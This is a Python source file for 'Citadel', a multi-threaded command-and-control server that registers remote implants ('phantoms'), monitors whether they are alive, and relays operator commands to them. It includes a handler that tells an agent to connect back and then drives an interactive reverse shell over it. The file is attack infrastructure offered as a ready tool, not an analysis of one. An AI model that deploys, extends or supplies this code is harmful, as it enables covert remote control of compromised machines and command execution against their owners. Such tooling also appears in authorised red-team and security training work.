"""
Citadel C2 Server

Features:
- Multi-threaded agent handling
- Persistent agent management
- Reverse shell provisioning
- Health monitoring
- Command dispatching

Author: johntad
Description: A simple command and control (C2) server for managine remote agents (or phantoms as we call them).
"""

import sys
import socket
import threading
import time
import logging
from colorama import init, Fore
from typing import Dict, List, Tuple

from citadel import C2Protocol

init(autoreset=True)  # Colorama initialization


class CitadelServer:
    """
    Manages connections from remote phantoms and handles command execution.
    """

    def __init__(self, host: str = '0.0.0.0', c2_port: int = 8886, shell_port: int = 8887):
        """
        Initializes the Citadel server.

        Args:
            host (str): The IP address to listen on. Defaults to '0.0.0.0' (all interfaces).
            c2_port (int): The port for the main command and control communication. Defaults to 8886.
            shell_port (int): The port for the reverse shell connection. Defaults to 8887.
        """
        self.host = host
        self.c2_port = c2_port
        self.shell_port = shell_port
        self.active_agents: Dict[int, Tuple[socket.socket, dict]] = {}
        self.lock = threading.Lock()
        self.running = False
        self._init_logging()

    def _init_logging(self):
        """
        Configure logging system

        Sets up basic configuration with a custom format including timestamps, log levels,
        and colored output using colorama.
        """
        logging.basicConfig(
            format=f"{Fore.CYAN}[%(asctime)s] {Fore.GREEN}%(levelname)s {Fore.WHITE}%(message)s",
            level=logging.INFO,
            datefmt="%H:%M:%S"
        )

    def start(self):
        """
        Start C2 server components

        This includes creating the main C2 socket, starting threads for accepting new agents and monitoring their health, and running the interactive command interface. 
        """
        self.running = True
        self.c2_socket = self._create_socket()

        threading.Thread(target=self._accept_agents, daemon=True).start()
        threading.Thread(target=self._health_monitor, daemon=True).start()

        if not getattr(self, '_is_testing', False):
            self._command_interface()

    def _create_socket(self) -> socket.socket:
        """
        Initialize and bind server socket

        Returns:
            socket.socket: The created and bound socket object.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.c2_port))
        sock.listen(5)
        logging.info(f"C2 server listening on {self.host}:{self.c2_port}")
        return sock

    def _accept_agents(self):
        """
        Handle incoming agent connections

        This method runs in a separate thread and continously accepts new connections,
        regusters the agent, and logs the connection event.
        """
        while self.running:
            try:
                conn, addr = self.c2_socket.accept()
                agent_info = self._register_agent(conn)
                logging.info(
                    f"New agent connected: {agent_info['hostname']} ({addr[0]})")
            except Exception as e:
                logging.error(f"Connection error: {str(e)}")

    def _register_agent(self, conn: socket.socket) -> dict:
        """
        Process agent registration and store metadata

        Receives initial information from the agent, parse it using C2Protocol,
        assigns a unique ID, stores the connection and metadata, and returns the agent's info

        Args:
            conn (soket.socket): The socket object of the newly connected agent.

        Returns:
            dict: A dictionaty containing the agent's metadata

        Raises:
            Exception: If registrations fails due to communication or parsing errors.
        """
        try:
            header, payload = C2Protocol.parse_message(conn.recv(4096))
            if header == "SYSTEM_INFO":
                with self.lock:
                    agent_id = len(self.active_agents) + 1
                    self.active_agents[agent_id] = (conn, payload['data'])
                    return payload['data']
        except Exception as e:
            logging.error(f"Registration failed: {str(e)}")
            conn.close()
            raise

    def _health_monitor(self):
        """
        Periodically verify agent connectivity

        This method runs in a separate thread and iterates through the active agents,
        sending a keep-alive message and expecting a response. Agents that don't respond are considered inactive adn are removed from the actie agents list.
        """
        while self.running:
            time.sleep(15)
            with self.lock:
                to_remove = []
                for agent_id, (conn, metadata) in self.active_agents.items():
                    try:
                        conn.send(C2Protocol.build_message("KEEPALIVE"))
                        conn.recv(4)  # Expect empty ACK
                    except:
                        to_remove.append(agent_id)
                        logging.warning(
                            f"Agent {metadata['hostname']} timed out")

                for agent_id in to_remove:
                    del self.active_agents[agent_id]

    def _command_interface(self):
        """
        Interactive command console

        Allows the operator to issue commands to manage and interact with connected agents
        """
        commands = {
            'list': self._list_agents,
            'interact': self._agent_interaction,
            'shell': self._reverse_shell,
            'help': self._show_help,
            'exit': self.shutdown
        }

        while self.running:
            try:
                cmd = input(
                    f"{Fore.CYAN}Citadel> {Fore.WHITE}").strip().lower()
                commands.get(cmd, self._invalid_command)()
            except KeyboardInterrupt:
                self.shutdown()
            except Exception as e:
                logging.error(f"Command error: {str(e)}")

    def _list_agents(self):
        """List all connected agents"""
        with self.lock:
            if not self.active_agents:
                logging.warning("No active agents")
                return

            print(f"\n{Fore.CYAN}Active Agents:{Fore.WHITE}")
            for agent_id, (_, metadata) in self.active_agents.items():
                print(f"{agent_id}: {metadata['hostname']} ({metadata['os']})")

    def _agent_interaction(self, _=None):
        """
        Interact with specific agent

        Prompts for the agent ID and tehn enters a sub-shell where commands can be sent
        to the selected agents. Responses from the agent are printed to the console.
        """
        agent_id = input("Enter phantom ID: ").strip()
        try:
            agent_id = int(agent_id)
            conn, metadata = self.active_agents[agent_id]
        except (ValueError, KeyError):
            logging.error("Invalid phantom ID")
            return

        print(f"Connected to {metadata['hostname']}")
        while True:
            cmd = input(f"Phantom@{agent_id}> ").strip()
            if cmd.lower() == "exit":
                return

            try:
                conn.send(C2Protocol.build_message("COMMAND", cmd))
                _, response = C2Protocol.parse_message(conn.recv(4096))
                print(response.get('data', ''))
            except Exception as e:
                logging.error(f"Command failed: {str(e)}")
                return

    def _reverse_shell(self, _=None):
        """
        Initiate reverse shell session

        Prompts for the phantom ID, intstructs the phantom to connect back on the shell port,
        and then handles the interactive shell session.
        """
        agent_id = input("Enter phantom ID: ").strip()
        try:
            agent_id = int(agent_id)
            conn, _ = self.active_agents[agent_id]
        except (ValueError, KeyError):
            logging.error("Invalid agent ID")
            return

        try:
            # Start reverse shell handler
            shell_socket = self._create_shell_socket()
            conn.send(C2Protocol.build_message(
                "SHELL", {"port": self.shell_port}))

            logging.info("Reverse shell session starting...")
            self._handle_shell(shell_socket)
        except Exception as e:
            logging.error(f"Shell failed: {str(e)}")

    def _create_shell_socket(self) -> socket.socket:
        """
        Set up reverse shell listener

        Returns:
            socket.socket: The created and boutn socket object for the reverse shell
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.shell_port))
        sock.listen(1)
        return sock

    def _handle_shell(self, sock: socket.socket):
        """
        Manage reverse shell session

        Accepts the incoming connection from the agent and then enters a loop to send commands to the agent and print the received output.
        """
        conn, addr = sock.accept()
        logging.info(f"Shell connection from {addr}")

        try:
            while True:
                cmd = input("$ ")
                conn.send(cmd.encode())
                output = conn.recv(4096).decode()
                print(output)
        except KeyboardInterrupt:
            conn.close()
            sock.close()

    def _show_help(self, _=None):
        """
        Display help menu
        """
        print(f"""{Fore.YELLOW}
Commands:
  list       - Show connected agents
  interact   - Connect to specific agent
  shell      - Start reverse shell session
  help       - Show this help menu
  exit       - Shutdown server{Fore.WHITE}""")

    def _invalid_command(self, cmd: str):
        """
        Logs an error message for an unrecognized ocommand

        Args:
            cmd (str): The invalid command that was entered.
        """
        logging.error(f"Invalid command: {cmd}")

    def shutdown(self):
        """
        Graceful server shutdown

        Closes the main C2 socket and logs the shutdown event.
        """
        self.running = False
        self.c2_socket.close()
        logging.info("Citadel shutdown complete")
        sys.exit(0)
